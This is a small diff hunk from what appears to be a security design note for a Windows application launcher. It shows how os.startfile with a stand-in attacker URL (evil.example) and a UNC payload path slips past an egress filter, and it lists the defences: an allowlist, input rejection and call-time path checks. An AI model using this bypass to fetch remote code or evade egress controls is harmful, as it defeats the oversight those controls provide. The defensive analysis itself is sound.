@@ -151,7 +151,7 @@ verified against a human clicking anything.
 
 `os.startfile("http://evil.example")` opens the default browser and fetches the
 URL **through the shell**, so `Egress` never sees it. UNC paths
-(`\host\share\payload.exe`) do the same across the network. Therefore:
+(`\\host\share\payload.exe`) do the same across the network. Therefore:
 closed allowlist of known applications in config; reject URL-shaped and UNC-shaped
 input *before* touching any Windows API; `realpath`-verify the resolved target
 against the allowed-directory set **at call time**, not at load time (junctions
